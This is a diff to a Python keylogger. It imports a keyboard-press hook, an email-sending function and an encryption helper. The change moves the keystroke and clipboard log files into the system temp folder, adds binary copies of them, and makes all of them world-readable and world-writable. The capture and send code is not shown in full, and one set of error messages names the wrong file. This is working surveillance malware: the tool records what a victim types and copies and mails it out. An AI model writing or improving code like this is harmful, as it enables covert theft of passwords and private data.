@@ -1,5 +1,6 @@
 import atexit
 import os
+import stat
 import threading
 import time
 from datetime import datetime 
@@ -9,16 +10,70 @@ from threading import Thread
 import ctypes
 from emailFunctionality import sendEmail
 from encryption import encryptContents 
+import tempfile
 
 ThreadRunning = True
+log_file = os.path.join(tempfile.gettempdir(), 'logs.txt')
 
-log_file = "logs.txt"
+# log_file = "logs.txt"
 clipBoard_file = "clipBoardLogs.txt"
+clipBoard_file = os.path.join(tempfile.gettempdir(), 'clipBoardLogs.txt')
 
 
-with open(log_file, "w") and open(clipBoard_file, "w"):
+logBin = os.path.join(tempfile.gettempdir(), 'logs.bin')
+
+# log_file = "logs.txt"
+clipBin = os.path.join(tempfile.gettempdir(), 'clipBoardLogs.bin')
+
+try:
+    os.chmod(log_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+    print(f"Permissions for {log_file} changed successfully.")
+except PermissionError:
+    print(f"Permission denied: Unable to change permissions for {log_file}.")
+except FileNotFoundError:
+    print(f"File not found: {log_file} does not exist.")
+except Exception as e:
+    print(f"An error occurred: {e}")
+
+
+try:
+    os.chmod(clipBoard_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+    print(f"Permissions for {log_file} changed successfully.")
+except PermissionError:
+    print(f"Permission denied: Unable to change permissions for {log_file}.")
+except FileNotFoundError:
+    print(f"File not found: {log_file} does not exist.")
+except Exception as e:
+    print(f"An error occurred: {e}")
+
+try:
+    os.chmod(logBin, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+    print(f"Permissions for {logBin} changed successfully.")
+except PermissionError:
+    print(f"Permission denied: Unable to change permissions for {logBin}.")
+except FileNotFoundError:
+    print(f"File not found: {logBin} does not exist.")
+except Exception as e:
+    print(f"An error occurred: {e}")
+
+
+try:
+    os.chmod(clipBin, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+    print(f"Permissions for {clipBin} changed successfully.")
+except PermissionError:
+    print(f"Permission denied: Unable to change permissions for {clipBin}.")
+except FileNotFoundError:
+    print(f"File not found: {clipBin} does not exist.")
+except Exception as e:
+    print(f"An error occurred: {e}")
+
+
+
+with open(log_file, "w"):
     pass
 
+with open(clipBoard_file, "w"):
+    pass
 def on_press(key):
     global ThreadRunning
     if key == keyboard.Key.esc:
